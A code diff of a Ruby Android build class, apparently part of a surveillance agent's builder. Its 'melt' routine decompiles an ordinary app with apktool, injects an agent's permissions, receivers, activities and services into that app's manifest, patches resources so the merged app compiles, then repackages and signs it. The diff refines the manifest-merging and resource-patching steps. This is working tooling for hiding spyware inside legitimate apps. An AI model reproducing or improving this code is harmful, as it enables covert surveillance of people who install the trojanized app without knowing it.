@@ -23,13 +23,15 @@ class BuildAndroid < Build
     trace :debug, "Build: apktool extract: #{@tmpdir}/apk"
 
     apktool = path('apktool.jar')
+    
     Dir[path('core.*.apk')].each do |d| 
       version = d.scan(/core.android.(.*).apk/).flatten.first
 
       if version == "melt" then
+        #CrossPlatform.exec "java", "-jar #{apktool} if #{@tmpdir}/jelly.apk jelly" 
         CrossPlatform.exec "java", "-jar #{apktool} d #{d} #{@tmpdir}/apk.#{version}"
       else
-        CrossPlatform.exec "java", "-jar #{apktool} d -s -r #{d} #{@tmpdir}/apk.#{version}"
+        CrossPlatform.exec "java", "-jar #{apktool} d -s -r #{d}  #{@tmpdir}/apk.#{version}"
       end
       
       ["r.bin", "c.bin"].each do |asset|
@@ -58,12 +60,12 @@ class BuildAndroid < Build
       super
       
       patch_file(:file => params[:core]) do |content|
-        begin
-          method = params['admin'] ? 'IrXCtyrrDXMJEvOU' : SecureRandom.random_bytes(16)
-          content.binary_patch 'IrXCtyrrDXMJEvOU', method
-        rescue
-          raise "Working method marker not found"
-        end
+      begin
+        method = params['admin'] ? 'IrXCtyrrDXMJEvOU' : SecureRandom.random_bytes(16)
+        content.binary_patch 'IrXCtyrrDXMJEvOU', method
+      rescue
+        raise "Working method marker not found"
+      end
       end
     end
   end
@@ -89,7 +91,7 @@ class BuildAndroid < Build
     trace :debug, "Build: melt output is: #{@outputs.inspect}"
     
     raise "Melt failed" if @outputs.empty?
-   end
+  end
 
   def sign(params)
     trace :debug, "Build: signing with #{Config::CERT_DIR}/android.keystore"
@@ -147,6 +149,7 @@ class BuildAndroid < Build
     end
 
     apktool = path('apktool.jar')
+
     Dir[path('core.*.apk')].each do |apk|
       version = apk.scan(/core.android.(.*).apk/).flatten.first
 
@@ -187,9 +190,9 @@ class BuildAndroid < Build
     end
   end
 
-  def melted(input)      
+  def melted(input)    
     apktool = path('apktool.jar')
-  
+    
     FileUtils.mv input, path('input')
     rcsdir = "#{@tmpdir}/apk.melt"
     pkgdir = "#{@tmpdir}/melt_input"
@@ -208,6 +211,9 @@ class BuildAndroid < Build
     patchXml("#{rcsdir}/AndroidManifest.xml", newmanifest)
     patchXml("#{rcsdir}/res/values/styles.xml", style)
     patchXml("#{rcsdir}/res/values/colors.xml", color)
+    
+    # fix textAllCaps
+    patchResources(rcsdir)
 
     # repack the final application
     apk = path("output.melt.apk")
@@ -222,8 +228,7 @@ class BuildAndroid < Build
     xmlrcs = XmlSimple.xml_in("#{rcsdir}/AndroidManifest.xml", {'KeepRoot' => true})
     xmlpkg = XmlSimple.xml_in("#{pkgdir}/AndroidManifest.xml", {'KeepRoot' => true})
 
-    xmlpkg["manifest"][0]["uses-permission"] += xmlrcs["manifest"][0]["uses-permission"]
-
+    mixManifestPermission(xmlpkg, xmlrcs, "uses-permission")
     mixManifestApplication(xmlpkg, xmlrcs, "receiver")
     mixManifestApplication(xmlpkg, xmlrcs, "activity")
     mixManifestApplication(xmlpkg, xmlrcs, "service")
@@ -235,6 +240,17 @@ class BuildAndroid < Build
     raise "Cannot parse Manifest: #{e.message}"
   end
 
+  def mixManifestPermission(xmlpkg, xmlrcs, key)
+    tmppkg = xmlpkg["manifest"][0]
+    tmprcs = xmlrcs["manifest"][0]
+
+    if tmppkg.has_key? key
+      tmppkg[key] += tmprcs[key]
+    else
+      tmppkg[key] = tmprcs[key]
+    end
+  end
+  
   def mixManifestApplication(xmlpkg, xmlrcs, key)
     tmppkg = xmlpkg["manifest"][0]["application"][0]
     tmprcs = xmlrcs["manifest"][0]["application"][0]
@@ -256,10 +272,36 @@ class BuildAndroid < Build
     return manifestStyle, manifestCol
   end
   
-   def patchXml(file, xml)
+  def patchXml(file, xml)
     xml.insert(0, "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n")
     File.open(file, "w") {|f| f.write xml}
   end
+  
+  def patchResources(rcsdir)
+    matches = ['android:textAllCaps="true"', '<item name="android:borderTop">true</item>']
+    #matches = ['android:textAllCaps="true"']
+    
+    Dir["#{rcsdir}/res/**/*.xml"].each do |filename|
+      found = false
+      content = ""
+
+      File.open(filename, 'r').each do |line|
+        matches.each do |match|
+        if line.include? match
+          found = true
+          line = line.sub(match, '')
+        end
+      end
+      
+      content+=line
+    end
+    
+    trace :debug, "melt resource patched: #{filename}" if found  
+    File.open("#{filename}", 'w') { |out_file| out_file.write content } if found
+
+    end
+  end
+
   
   def mixManifestResources(from, to, key)
     xt = XmlSimple.xml_in to, {'KeepRoot' => true}
